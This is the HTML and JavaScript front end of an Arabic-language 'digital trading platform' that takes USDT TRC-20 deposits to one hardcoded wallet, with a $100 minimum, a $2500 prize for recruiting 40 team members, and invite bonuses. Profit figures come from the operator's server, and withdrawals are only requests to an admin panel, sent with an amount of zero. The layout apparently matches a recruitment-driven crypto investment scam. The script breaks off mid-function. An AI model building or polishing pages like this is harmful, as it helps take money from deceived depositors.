<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصة التداول الرقمية</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0b1426;
            color: #ffffff;
            margin: 0;
            padding: 20px;
            direction: rtl;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
        }
        h2 { text-align: center; color: #ffffff; margin-bottom: 20px; font-size: 22px; }
        .box {
            background-color: #152238;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 15px;
            border: 1px solid #1c2d4a;
        }
        label { display: block; margin-bottom: 8px; font-size: 14px; color: #a0aec0; }
        input[type="text"], input[type="number"] {
            width: 100%;
            padding: 12px;
            border-radius: 6px;
            border: 1px solid #2d3748;
            background-color: #0b1426;
            color: #fff;
            box-sizing: border-box;
            margin-bottom: 10px;
            font-size: 14px;
        }
        button, .btn-link {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 6px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            margin-top: 5px;
            color: white;
            box-sizing: border-box;
            display: block;
            text-align: center;
            text-decoration: none;
        }
        .btn-blue { background-color: #0072ff; }
        .btn-green { background-color: #38ef7d; color: #0b1426; }
        .btn-orange { background-color: #ff5858; }
        .btn-telegram { background: linear-gradient(135deg, #0088cc, #00a2ed); margin-top: 15px; }
        .stats { margin-top: 10px; }
        .stat-line { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #1c2d4a; }
        .stat-line:last-child { border-bottom: none; }
        .alert { color: #ff5858; font-size: 12px; display: block; margin-top: 5px; text-align: right; }
    </style>
</head>
<body>

<div class="container">
    <h2>منصة التداول الرقمية</h2>

    <!-- 1. قفل اسم المستخدم -->
    <div class="box">
        <label>👤 اسم المستخدم الحالي:</label>
        <input type="text" id="username" placeholder="يرجى حفظ وقفل اسم المستخدم الخاص بك">
        <button class="btn-blue" onclick="registerUser()">💾 حفظ وقفل الحساب</button>
    </div>

    <!-- 2. الجائزة الكبرى وأعضاء الفريق -->
    <div class="box">
        <label>🏆 الجائزة الكبرى (40 عضوا'ً): 2500 دولار أمريكي</label>
        <label>أعضاء فريقك النشطين: <span id="teamCount" style="color:#38ef7d; font-weight:bold;">0 / 40</span></label>
        <button class="btn-orange" onclick="sendBonusRequest()">📢 إرسال طلب المكافأة إلى المدير</button>
    </div>

    <!-- 3. لوحة الأرصدة والأرباح الحية (الخانات الأربعة المنفصلة) -->
    <div class="box">
        <div class="stats">
            <div class="stat-line">
                <span>💰 إجمالي رأس المال:</span>
                <span id="capital" style="font-weight:bold; color:#38ef7d;">USDT 0.00</span>
            </div>
            <div class="stat-line">
                <span>📊 أرباح اليوم:</span>
                <span id="todayProfit" style="font-weight:bold; color:#38ef7d;">USDT 0.00</span>
            </div>
            <div class="stat-line">
                <span>🎁 عوائد التذاكر:</span>
                <span id="ticketProfit" style="font-weight:bold; color:#38ef7d;">USDT 0.00</span>
            </div>
            <div class="stat-line">
                <span>🎉 مكافأة الدعوة:</span>
                <span id="inviteProfit" style="font-weight:bold; color:#38ef7d;">USDT 0.00</span>
            </div>
        </div>
    </div>

    <!-- 4. عمليات السحب الفوري -->
    <div class="box">
        <label>🚨 لوحة عمليات السحب الفوري (شبكة TRC-20):</label>
        <input type="text" id="withdrawAddress" placeholder="أدخل عنوان محفظة TRC-20 الخاصة بك...">
        <button class="btn-orange" style="margin-bottom:8px;" onclick="withdraw('Toplam Sermayeyi Çek')">💸 سحب رأس المال بالكامل</button>
        <button class="btn-blue" style="margin-bottom:8px;" onclick="withdraw('Bugünkü Kârı Çek')">📊 سحب أرباح اليوم</button>
        <button class="btn-blue" onclick="withdraw('Davetiye Ödülünü Çek')">🎁 سحب مكافأة الدعوة</button>
    </div>

    <!-- 5. إرسال طلب إيداع والدعم الفني -->
    <div class="box">
        <label>📥 طلب إيداع جديد (USDT TRC-20):</label>
        <input type="text" id="walletAddress" value="TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN" readonly style="text-align:center; color:#38ef7d; font-weight:bold; direction: ltr;">
        <button class="btn-blue" style="margin-bottom:12px;" onclick="copyWallet()">📋 نسخ عنوان المحفظة</button>
        
        <label>المبلغ المراد إيداعه:</label>
        <input type="number" id="depositAmount" placeholder="أدخل المبلغ هنا...">
        <span class="alert">⚠ الحد الأدنى لمبلغ الإيداع هو 100 دولار</span>
        <button class="btn-green" style="margin-top:8px;" onclick="sendDeposit()">⚡ إرسال طلب إيداع حقيقي</button>

        <!-- رابط الدعم الفني المباشر المربوط بحسابك -->
        <a href="https://t.me" target="_blank" class="btn-link btn-telegram">🚀 تواصل مع فريق الدعم الفني عبر تليجرام</a>
    </div>
</div>

<script>
    const API_BASE_URL = "https://onrender.com";

    async function registerUser() {
        const username = document.getElementById('username').value.trim();
        if(!username) return alert('يرجى إدخال اسم مستخدم صحيح!');
        try {
            const res = await fetch(`${API_BASE_URL}/api/register-user`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username })
            });
            const data = await res.json();
            if(data.success) {
                alert('تم قفل وحفظ اسم المستخدم بنجاح في قاعدة البيانات!');
                localStorage.setItem('savedUsername', username);
                loadUserData(username);
            }
        } catch(err) { alert('فشل الاتصال بالسيرفر، يرجى المحاولة لاحقاً!'); }
    }

    async function loadUserData(username) {
        if(!username) return;
        try {
            const res = await fetch(`${API_BASE_URL}/api/users/${username}`);
            const data = await res.json();
            document.getElementById('capital').innerText = `USDT ${data.capital.toFixed(2)}`;
            document.getElementById('todayProfit').innerText = `USDT ${data.todayProfit.toFixed(2)}`;
            document.getElementById('inviteProfit').innerText = `USDT ${data.inviteProfit.toFixed(2)}`;
            document.getElementById('ticketProfit').innerText = `USDT ${(data.inviteProfit * 0.3).toFixed(2)}`; // حسبة افتراضية لعوائد التذاكر
            document.getElementById('teamCount').innerText = `${data.teamCount} / 40`;
        } catch(err) { console.error(err); }
    }

    async function withdraw(type) {
        const username = localStorage.getItem('savedUsername');
        const address = document.getElementById('withdrawAddress').value.trim();
        if(!username) return alert('يرجى قفل وحفظ اسم المستخدم الخاص بك أولاً من أعلى الشاشة!');
        if(!address) return alert('يرجى إدخال عنوان محفظتك لاستلام الأموال!');
        try {
            const res = await fetch(`${API_BASE_URL}/api/orders`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, type, address, amount: 0 })
            });
            const data = await res.json();
            if(data.success) alert('تم إرسال طلب السحب بنجاح إلى لوحة المشرف!');
        } catch(err) { alert('فشلت العملية!'); }
    }

    async function sendDeposit() {
        const username = localStorage.getItem('savedUsername');
        const amount = parseFloat(document.getElementById('depositAmount').value);
        if(!username) return alert('يرجى قفل وحفظ اسم المستخدم الخاص بك أولاً من أعلى الشاشة!');
        if(isNaN(amount) || amount < 100) return alert('الحد الأدنى لمبلغ الإيداع هو 100 دولار!');
        try {
            const res = await fetch(`${API_BASE_URL}/api/orders`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, type: 'Yatırma', amount, address: 'طلب معلق' })
            });
            const data = await res.json();
            if(data.success) alert('تم إرسال طلب الإيداع بنجاح، يرجى الانتظار موافقة المشرف!');
        } catch(err) { alert('تعذر إرسال طلب الإيداع.'); }
    }

    async function sendBonusRequest() {
        const username = localStorage.getItem('savedUsername');
        if(!username) return alert('يرجى قفل وحفظ اسم المستخدم الخاص بك أولاً من أعلى الشاشة!');
        try {
            const res = await fetch(`${API_BASE_URL}/api/orders`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, type: 'Referans Bonusunu Çek', amount: 2500, address: 'طلب مكافأة' })
            });
            const data = await res.json();
            if(data.success) alert('تم إرسال طلب مكافأة الجائزة الكبرى بنجاح للمدير!');
        } catch(err) { alert('حدث خطأ!'); }
    }

    function copyWallet() {
        const copyText = document.getElementById("walletAddress");
        copyText.select();
        navigator.clipboard.writeText(copyText.value);
        alert("تم نسخ عنوان المحفظة بنجاح: " + copyText.value);
    }

    setInterval(() => {
        const savedUsername = localStorage.getItem('savedUsername');
        if(savedUsername) loadUserData(savedUsername);
    }, 5000);

    window.onload = function() {
